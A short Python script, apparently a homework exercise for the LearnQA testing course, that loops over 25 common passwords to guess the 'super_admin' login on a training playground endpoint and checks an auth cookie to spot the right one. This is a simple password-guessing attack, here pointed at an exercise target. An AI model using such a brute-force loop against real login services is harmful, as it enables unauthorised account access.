import json
import time

import requests

get_pass_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
top25passwords = [123456, 123456789, "qwerty", "password", 1234567, 12345678, 12345, "iloveyou", 111111, 123123,
                  "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", 654321, 555555, "lovely", 7777777,
                  "welcome", 888888, "princess", "dragon", "password1", "123qwe"]

for password in top25passwords:
    res = requests.post(get_pass_url, data={"login": "super_admin", "password": password})
    auth_cookies = res.cookies.get("auth_cookie")

    cookies = {'auth_cookie': auth_cookies}
    res2 = requests.post(check_cookie_url, cookies=cookies)

    if res2.text == "You are authorized":
        print("Верный пароль - ", password)


